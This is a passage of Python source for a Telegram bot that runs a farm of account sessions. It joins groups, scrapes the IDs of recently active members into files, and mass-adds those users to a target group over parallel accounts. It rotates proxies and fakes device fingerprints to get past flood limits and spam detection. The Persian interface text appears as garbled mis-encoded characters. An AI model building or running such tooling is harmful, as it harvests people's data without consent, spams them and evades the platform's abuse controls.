                await event.reply("** â€¼ï¸ add @link 4 50 [0/1/2/3/4/5/.../100] **")

        #### ---- help :)
        elif event.raw_text.lower() == 'help' or event.raw_text.lower() == "Ø±Ø§Ù‡Ù†Ù…Ø§":
            await event.reply("""
            help

â—¾ï¸Ù…ØªÙ† Ø±Ø§Ù‡Ù†Ù…Ø§ 
ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

/addphon Ø´Ù…Ø§Ø±Ù‡

â—¾ï¸ Ø¨Ø±Ø§ÛŒ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø­Ø³Ø§Ø¨ Ú©Ø§Ø±Ø¨Ø±ÛŒ Ø¬Ø¯ÛŒØ¯ 

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸
/web Ú©Ø¯

â—¾ï¸Ú©Ø¯ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø³Ø§ÛŒØª ØªÙ„Ú¯Ø±Ø§Ù…

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

/cod Ú©Ø¯

â—¾ï¸Ú©Ø¯ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ ØªÙ„
ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

/pass Ù¾Ø³ÙˆØ±Ø¯ Ø§Ú©Ø§Ù†Øª

â—¾ï¸Ù¾Ø³ÙˆØ±Ø¯ Ø§Ú©Ø§Ù†Øª Ù…ÙˆØ±Ø¯Ù†Ø¸Ø±

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

â—¾ï¸Ø´Ø±ÙˆØ¹ ÛŒÙˆØ²Ø±Ú¯ÛŒØ±ÛŒ Ø§Ø² Ú¯Ø±ÙˆÙ‡

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸
â—¾ï¸Ø¨Ø±Ø§ÛŒ Ù†Ù…Ø§ÛŒØ´ Ø­Ø°Ù ÛŒØ§ Ù…Ø±ØªØ¨ Ú©Ø±Ø¯Ù† Ø­Ø³Ø§Ø¨ Ù‡Ø§
ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

â—¾ï¸Ø°Ø®ÛŒØ±Ù‡ Ú©Ø±Ø¯Ù† ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø¬Ù…Ø¹ Ø¢ÙˆØ±ÛŒ Ø´Ø¯Ù‡

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

â—¾ï¸Ù…Ø´Ø§Ù‡Ø¯Ù‡ ÛŒÙˆØ²Ø±Ù‡Ø§ÛŒ Ø¬Ù…Ø¹ Ø´Ø¯Ù‡ Ø¯Ø± Ø¯ÛŒØªØ§Ø¨ÛŒØ³

ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

bot

â—¾ï¸Ù†Ù…Ø§ÛŒØ´ Ø§Ù†Ù„Ø§ÛŒÙ†ÛŒ Ø±Ø¨Ø§Øª

 ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸ã€°ï¸

add @link 6 50

â—¾ï¸Ø§ØºØ§Ø² ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø§ 6Ø´Ù…Ø§Ø±Ù‡ Ù‡Ù…Ø²Ù…Ø§Ù† Ùˆ Ù‡Ø±Ø´Ù…Ø§Ø±Ù‡ 50 Ø§Ø¯ 

addmin : @ImTanun
            """, buttons=[[Button.inline('sudo list', 'llsudo'), Button.inline('del sudo', 'delsudooo')], [Button.inline('add sudo', 'addsudoo')]])


async def join2(clt, ls, log_msg):
    print(" i am in join ")
    try:
        if '@' in ls:
            print("join func")
            await clt(functions.channels.JoinChannelRequest(channel=ls))
            print("xxxx")
        else:
            print("join func")
            await clt(functions.messages.ImportChatInviteRequest(hash=ls.split('/')[-1]))
            print("yyyyy")
        return True

    except errors.rpcerrorlist.FloodWaitError as e:

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        # wait += random.randint(100 , 200)

        await log_msg.edit("âš ï¸ [**join**] ØµØ¨Ø± Ú©Ù†   ** {} ** Ø«Ø§Ù†ÛŒÙ‡".format(wait))

        if (wait >= 200):
            return -1000  # flood Code

        await asyncio.sleep(wait)

        return None


    except errors.rpcerrorlist.UserAlreadyParticipantError:
        return True

    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")

        await log_msg.edit("Account is Deleted")
        return -1

    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await log_msg.edit("Account is Deleted")

        return -1

    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await log_msg.edit("Account is Deleted")

        return -1

    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await log_msg.edit("Account is Deleted")

        return -1


    except errors.rpcerrorlist.AuthKeyUnregisteredError:
        print("AuthKeyUnregisteredError")
        await log_msg.edit("AuthKeyUnregisteredError")

        return -1

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await log_msg.edit("Account is Deleted")

        return -1



    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")

        await log_msg.edit("Account is Deleted")
        return -1


    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await log_msg.edit("Account is Deleted")

        return -1



    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")

        await log_msg.edit("Account is Deleted")
        return -1



    except Exception as e:
        print("FOO : ", e.__class__, str(e))
        return -1


async def join(client, link, phone):
    print("--------------> ", link)
    try:
        print(client)
        if '@' in link:
            print("@ dar")
            await client(JoinChannelRequest(channel=link))
        else:
            print("adiiii")
            await client(ImportChatInviteRequest(hash=link))
        return True
    except errors.UserAlreadyParticipantError:
        return True
    except errors.UserDeactivatedBanError:
        return -1
    except errors.UserDeactivatedError:
        return -1
    except errors.SessionExpiredError:
        return -2
    except errors.SessionRevokedError:
        return -2

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        return -3


    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")

        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -4  ## Delete

    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await client.disconnect()

        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -4  ## Delete


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete

    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete


    except errors.rpcerrorlist.SessionPasswordNeededError:

        print("[!] SessionPasswordNeededError")
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4  ## Delete



    except errors.rpcerrorlist.FloodWaitError as e:

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        # wait += random.randint(100 , 200)

        await log_msg.edit("âš ï¸ [**join**] ØµØ¨Ø± Ú©Ù†   ** {} ** Ø«Ø§Ù†ÛŒÙ‡".format(wait))

        return -1000  # flood Code






    except Exception as e:
        print("[!] UnExpected Error : {}".format(str(e)))
        await client.disconnect()

        return -4  ## Delete


datauser = dict()
datauser["typeusers"] = [".", "."]
datauser["typeusers2"] = [".", "."]

@bot.on(events.CallbackQuery)
async def _(events):
    callback = events.data.decode()
    global addflag
    global noadd
    global join
    global datauser

    if (int(events.original_update.user_id) in NStEVJzsyY):

        if (callback.startswith("admin")):

            _, data = callback.split("|")

            NStEVJzsyY.remove(int(data))

            await events.answer("Ú©Ø§Ø±Ø¨Ø± {} Ø§Ø² Ø³ÙˆØ¯ÙˆÙ„ÛŒØ³Øª Ø­Ø°Ù Ø´Ø¯".format(data))

            try:
                await bot.send_message(int(data), '''âŒ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø´Ù…Ø§ ØªÙˆØ³Ø· Ù…Ø§Ù„Ú© Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª ! 
â–â–â–â–â–â– 
Ø¨Ø±Ø§ÛŒ ØªÙ…Ø§Ø³ Ù¾ÛŒØ§Ù… Ø¨Ù‡ @ir_robotmaker''')

            except Exception as e:

                await events.answer(str(e.__class__) + ":" + str(e))

        if callback.startswith("?"):

            # 2|40|3|https://t.me/joinchat/UlqJhddT1kJjYTEx|addUSERNAME

            ev = []
            global addflag
            global kosflag
            accs = []
            tl = 1

            ww = None
            text = ''

            print(callback.split("?")[1])
            num = int((callback.split("?")[1]).split("|")[0])
            delay = int((callback.split("?")[1]).split("|")[1])
            numacc = int((callback.split("?")[1]).split("|")[2])
            link = (callback.split("?")[1]).split("|")[3]
            mode = (callback.split("?")[1]).split("|")[4]

            # dirname = (callback.split("?")[1]).split("|")[5]

            print("num", num)
            print("numACC", numacc)

            delay = int(delay)

            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline('{} - {}'.format(tl, item.name)), Button.inline('â™»ï¸')]]
                    accs.append(item.name)
                    ev.extend(l)
                    tl += 1
                    ev.extend([[Button.inline('Last Work '), Button.inline(time.ctime(time.time()))]])

            if len(ev) > 1:

                try:
                    worker_msg = await events.reply(
                        'ğŸ† Ú¯Ø±ÙˆÙ‡ Ù…Ù‚ØµØ¯ : {} ğŸ˜‰ \n ğŸ— ØªØ¹Ø¯Ø§Ø¯ Ø§Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª: {}'.format(link, delay))

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        worker_msg = await events.reply(
                            'ğŸ† Ú¯Ø±ÙˆÙ‡ Ù…Ù‚ØµØ¯ : {} ğŸ˜‰ \n ğŸ— ØªØ¹Ø¯Ø§Ø¯ Ø§Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª: {}'.format(link, delay))

            taskCount = 0
            tasklist = []

            res1 = 0
            res2 = 0

            success = 0
            faild = 0
            duplicate = 0

            start = time.time()

            cancelALL = len(accs)

            accountL = []

            random.shuffle(accs)  ### Shuffle List

            for item in accs:

                if kosflag == 1:
                    break

                taskCount += 1
                tasklist.append(item)
                if (taskCount % numacc == 0):

                    if numacc == 1:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                    # ---------------------------
                    elif numacc == 2:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                            # -----------------------------
                    elif numacc == 3:
                        print("ppppppppppppppppppppppppp")
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])
                            # -----------------------------


                    # -----------------------------
                    elif numacc == 4:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])
                            # -----------------------------
                    elif numacc == 6:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t5 = bot.loop.create_task(
                            foo(tasklist[4], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t6 = bot.loop.create_task(
                            foo(tasklist[5], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])

                        if res5 != None:
                            success += int(res5[0])
                            faild += int(res5[1])
                            duplicate += int(res5[2])

                        if res6 != None:
                            success += int(res6[0])
                            faild += int(res6[1])
                            duplicate += int(res6[2])



                    elif numacc == 10:
                        t1 = bot.loop.create_task(
                            foo(tasklist[0], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t2 = bot.loop.create_task(
                            foo(tasklist[1], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t3 = bot.loop.create_task(
                            foo(tasklist[2], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t4 = bot.loop.create_task(
                            foo(tasklist[3], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t5 = bot.loop.create_task(
                            foo(tasklist[4], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t6 = bot.loop.create_task(
                            foo(tasklist[5], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t7 = bot.loop.create_task(
                            foo(tasklist[6], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t8 = bot.loop.create_task(
                            foo(tasklist[7], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t9 = bot.loop.create_task(
                            foo(tasklist[8], events, link, numacc, delay, worker_msg, mode, num, cancelALL))
                        t10 = bot.loop.create_task(
                            foo(tasklist[9], events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        if res1 != None:
                            success += int(res1[0])
                            faild += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success += int(res2[0])
                            faild += int(res2[1])
                            duplicate += int(res2[2])

                        if res3 != None:
                            success += int(res3[0])
                            faild += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success += int(res4[0])
                            faild += int(res4[1])
                            duplicate += int(res4[2])

                        if res5 != None:
                            success += int(res5[0])
                            faild += int(res5[1])
                            duplicate += int(res5[2])

                        if res6 != None:
                            success += int(res6[0])
                            faild += int(res6[1])
                            duplicate += int(res6[2])

                        if res7 != None:
                            success += int(res7[0])
                            faild += int(res7[1])
                            duplicate += int(res7[2])

                        if res8 != None:
                            success += int(res8[0])
                            faild += int(res8[1])
                            duplicate += int(res8[2])

                        if res9 != None:
                            success += int(res9[0])
                            faild += int(res9[1])
                            duplicate += int(res9[2])

                        if res10 != None:
                            success += int(res10[0])
                            faild += int(res10[1])
                            duplicate += int(res10[2])

            remainAcc = len(tasklist)
            # print (remainAcc)
            for item in tasklist:

                if kosflag == 1:
                    break

                taskCount += 1

                t1 = bot.loop.create_task(foo(item, events, link, numacc, delay, worker_msg, mode, num, cancelALL))

                res = await t1

                if res != None:
                    success += int(res[0])
                    faild += int(res[1])
                    duplicate += int(res[2])

            kosflag = 0
            end = time.time()

            text =' Ø§Ø¯Ø¯ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡ `{}` Ø¨Ø§ ` {}` Ø§Ú©Ø§Ù†Øª \nØ§Ø¯Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end - start)))[0:7])

            try:
                await events.reply(text, buttons=[[Button.inline("âœ…Ù…ÙˆÙÙ‚", "None"), Button.inline(str(success), "None")],
                                                  [Button.inline("âŒÙ†Ø§Ù…ÙˆÙÙ‚", "None"), Button.inline(str(faild), "None")],
                                                  [Button.inline("âš ï¸ØªÚ©Ø±Ø§Ø±ÛŒ", "None"),
                                                   Button.inline(str(duplicate), "None")]])

            except Exception as e:
                print("---------> ", e, e.__class__)
                pass

        if callback.startswith("@"):

            [_, mode, link] = callback.split("|")

            print(link)

            cont = 0

            if '@' in link or 'joinchat' in link:
                ev = []

                if 'joinchat' in link:
                    link = link.split('/')[-1]

                if mode == "addUsername":

                    for item in os.scandir('Accounts'):
                        if 'journal' not in item.name and '.session' in item.name:
                            l = [[Button.inline(item.name, '*l|{}|{}'.format(item.name, link))]]
                            ev.extend(l)
                            cont += 1

                    try:
                        await events.reply(
                            'ğŸ”† Ù„Ø·ÙØ§  ÛŒÚ©ÛŒ Ø§Ø² Ø§Ú©Ø§Ù†Øª Ù‡Ø§ Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ ØªØ§ Ø¯Ø± Ú¯Ø±ÙˆÙ‡  Ø¨Ù‡ Ù†Ù…Ø§ÛŒÙ†Ø¯Ú¯ÛŒ  Ø³Ø§ÛŒØ± Ø±Ø¨Ø§Øª Ù‡Ø§ Ø¹Ø¶Ùˆ Ø´ÙˆØ¯ \nhttps://t.me/joinchat/{}'.format(
                                link), buttons=ev)


                    except errors.rpcerrorlist.ReplyMarkupTooLongError:
                        for i in await list_splitter(ev, 20):
                            # print (i)

                            await events.reply(
                                'ğŸ”† Ù„Ø·ÙØ§  ÛŒÚ©ÛŒ Ø§Ø² Ø§Ú©Ø§Ù†Øª Ù‡Ø§ Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯ ØªØ§ Ø¯Ø± Ú¯Ø±ÙˆÙ‡  Ø¨Ù‡ Ù†Ù…Ø§ÛŒÙ†Ø¯Ú¯ÛŒ  Ø³Ø§ÛŒØ± Ø±Ø¨Ø§Øª Ù‡Ø§ Ø¹Ø¶Ùˆ Ø´ÙˆØ¯  \nhttps://t.me/joinchat/{}'.format(
                                    link), buttons=i)

                if mode == "addChatid":
                    ev = [Button.inline('Ø¨Ø³ØªÙ† ', 'close'), Button.inline('âœ… Start', '#l|{}'.format(link))]

                    await events.reply(
                        'ğŸ”† ØªÙ…Ø§Ù… Ø§Ú©Ø§Ù†Øª Ù‡Ø§ ÙØ±Ø§ÛŒÙ†Ø¯ Ø¬ÙˆÛŒÙ† Ø´Ø¯ Ø¯Ø± \nhttps://t.me/joinchat/{} Ø±Ø§ Ø¢ØºØ§Ø² Ú©Ø±Ø¯Ù† '.format(link),
                        buttons=ev)






            else:
                await events.reply(
                    'ğŸ”† Ù„Ø·ÙØ§ Ù„ÛŒÙ†Ú© Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª Ø¯Ø±Ø³Øª ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ !\nğŸ†˜https://t.me/joinchat/example\nğŸ†˜@group')

        if callback.startswith("&cancelALL"):
            kosflag = 1
            await events.answer("â€¼ï¸ All Accs Will Cancel")

        if callback.startswith("acccancell"):
            print(callback.split("|"))
            x = callback.split("|")[1]
            addflag[x] = "0"
            await events.answer("ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø§ Ø§ÛŒÙ† Ø§Ú©Ø§Ù†Øª Ù…ØªÙˆÙ‚Ù Ø´Ø¯  !")

        if callback.startswith(".addcencell"):
            x = callback.split("|")[1]

            noadd = "0"
            await events.answer("ÙØ±Ø§ÛŒÙ†Ø¯ Ø§Ø¯ Ø¨Ø§ ØªÙ…Ø§Ù… Ø§Ú©Ø§Ù†Øª Ù‡Ø§ Ù…ØªÙˆÙ‚Ù Ø´Ø¯  !")

        if callback.startswith("#l"):

            device = random.choice(devices)
            version1 = random.choice(version)

            [_, link] = callback.split('|')

            flag = 0

            count = 0

            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:

                    phone = item.name

                    count += 1
                    sleep(0.5)

                    await events.edit('| Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ..... \nğŸ‘½ Bot : {} '.format(count),
                                      buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…")]])

                    #### --- anti flood
                    apis2 = getapiPhone(phone)

                    sleep(0.5)

                    if apis2 != 0:

                        try:

                            ww = False

                            await events.edit("/ Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...n ğŸ‘½ Bot : {}".format(count),
                                              buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âŒ", "âœ…"), Button.inline("âŒ", "âœ…")]])
                            pr = await random_proxy()    
                            print(pr)          
                            # pr = random_proxy()
                            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
                            client = TelegramClient('Accounts/{}'.format(phone), int(apis2[0]), apis2[1],
                                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                                    proxy=pr,
                                                    device_model=device,
                                                    system_version=version1,
                                                    app_version="7.84",
                                                    lang_code='en',
                                                    system_lang_code='en')

                            await client.connect()

                            ww = await join(client, link, phone)

                            if ww == True:

                                keu = link

                                await events.edit('| Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ... Bot : {} '.format(count),
                                                  buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"), Button.inline("3ï¸âƒ£", "âŒ"), Button.inline("4ï¸âƒ£", "âŒ")],
                                          [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âœ…", "âœ…"), Button.inline("âŒ", "âœ…")]])

                                if '@' in link:
                                    keu = link.split('@')[1]

                                if (flag):

                                    links = link

                                    if not '@' in link:
                                        links = 'https://t.me/joinchat/{}'.format(link)

                                    for item in await  client.get_participants(links):
                                        counter += 1




                                elif (flag == 0):

                                    f1 = open('Database/{}id.txt'.format(keu), 'w')

                                    counter = 0

                                    links = link

                                    if not '@' in link:
                                        links = 'https://t.me/joinchat/{}'.format(link)
                                    
                                    # async for item in client.iter_participants(links, aggressive=True):
                                    #     if online_within(item, 6):
                                    #         f1.write(str(item.id) + "\n")

                                    #         counter += 1
                                    myid = (await client.get_me()).id
                                    bbb = Client(tele_to_pyro('Accounts/{}'.format(phone).replace(".session", ""), myid), int(apis2[0]), apis2[1])
                                    async with bbb:
                                        countMember = await bbb.get_chat_members_count(links)
                                        countFor = 26 if countMember >= 5000 else int(countMember/200) + 1
                                        lists = []
                                        s = 0
                                        counter = 0
                                        for i in range(countFor):
                                            for item in await bbb.get_chat_members(links, offset=s, limit=200):
                                                if str(item.user.id) not in lists and online_within_pyro(item, 6):
                                                    lists.append(str(item.user.id))
                                                    f1.write(str(item.user.id) + '\n')
                                                    counter += 1
                                            s += 200
                                            time.sleep(6.5)
                                        await bbb.disconnect()

                                    f1.close()
                                    await bot.send_file(events.chat_id, 'Database/{}id.txt'.format(keu),
                                                        caption="â™»ï¸ØªØ¹Ø¯Ø§Ø¯ `{}` ÛŒÙˆØ²Ø± Ø§Ø² Ú¯Ø±ÙˆÙ‡ Ù‡Ø¯Ù Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¬Ù…Ø¹ Ø§ÙˆØ±ÛŒ Ø´Ø¯!".format(
                                                            counter, keu))
                                    flag = 1

                                await events.edit('/ Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ...n ğŸ‘½ Bot : {}'.format(count),
                                                  buttons=[[Button.inline("1ï¸âƒ£", "âœ…"), Button.inline("2ï¸âƒ£", "âŒ"),
                                                            Button.inline("3ï¸âƒ£ : {}".format(counter), "âŒ"),
                                                            Button.inline("4ï¸âƒ£", "âŒ")],
                                                           [Button.inline("âœ… ", "âœ…"), Button.inline("âœ…", "âœ…"),
                                                            Button.inline("âœ…", "âœ…"), Button.inline("âœ…", "âœ…")]])

                                await client.disconnect()
                            elif ww == -1:
                                await events.edit('Ø­Ø³Ø§Ø¨ Ø´Ù…Ø§ Ø­Ø°Ù Ø´Ø¯Ù‡ Ø§Ø³Øª ! ...')
                                await client.disconnect()
                            elif ww == -2:
                                await events.edit('Ø¨Ø¨Ø®Ø´ÛŒØ¯ Ø±Ø¨Ø§Øª Ø§Ø² Ø¬Ù„Ø³Ø§Øª Ø§Ø®Ø±Ø§Ø¬ Ø´Ø¯ ...')
                                await client.disconnect()

                            elif ww == -3:
                                await events.edit("Ø¬Ù„Ø³Ù‡ Ø¯Ø± Ø¯Ùˆ Ø¢Ø¯Ø±Ø³ IP Ù…Ø®ØªÙ„Ù Ø§Ø¬Ø±Ø§ Ø´Ø¯ Ù„Ø·ÙØ§Ù‹ Ø­Ø³Ø§Ø¨ Ø¯ÛŒÚ¯Ø±ÛŒ Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯")
                                await client.disconnect()


                            elif ww == -4:
                                await events.edit("sessions Error")


                            elif ww == -1000:
                                await events.edit("FloodWait Error ")

                        except ValueError:
                            await events.respond("Ø§ÛŒÙ† Ù„ÛŒÙ†Ú© Ù…Ù†Ù‚Ø¶ÛŒ Ø´Ø¯Ù‡ Ùˆ ÛŒØ§ Ø¯Ø±Ø³Øª Ù†ÛŒØ³Øª ")
                            await client.disconnect()

                        except errors.rpcerrorlist.FloodWaitError as e:
                            wait = [int(s) for s in str(e).split() if s.isdigit()][0]
